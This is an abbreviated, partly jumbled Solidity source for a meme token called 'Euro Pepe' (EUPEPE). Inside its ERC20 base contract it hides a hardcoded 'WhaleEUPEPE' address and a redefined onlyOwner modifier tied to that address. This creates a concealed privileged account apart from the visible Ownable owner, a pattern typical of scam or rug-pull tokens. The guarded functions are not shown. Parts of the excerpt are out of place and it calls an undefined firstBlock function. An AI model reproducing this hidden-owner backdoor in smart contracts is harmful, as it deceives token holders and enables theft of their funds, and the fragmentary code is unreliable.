...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    string public EUPEPEwebsite = "https://EUPEPE.com/";
    string public EUPEPEADDRESS = "0x76f5fa3cDc7379f879f5DF4d18A347B3Eaed62d1";
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _name;
    string private _symbol;
    address private WhaleEUPEPE;
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
       _decimals = 9;
         WhaleEUPEPE = 0x76f5fa3cDc7379f879f5DF4d18A347B3Eaed62d1;      
    }
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _afterTokenTransfer(account, address(0), amount);
              ...
              function getEUPEPEwebsite() public view returns (string memory) {
        return EUPEPEwebsite;
    } 


               function getEUPEPEADDRESS() public view returns (string memory) {
        return EUPEPEADDRESS;
    }    
      modifier onlyOwner() {
         require(_msgSender() == WhaleEUPEPE);
        _;
    }    
    function _approve(
        address owner,
...
contract EUPEPE is ERC20, Ownable {
    constructor () ERC20("Euro Pepe", "EUPEPE") 
    {    
        firstBlock(msg.sender, 100_000000000 * (10 ** 9));
    }
}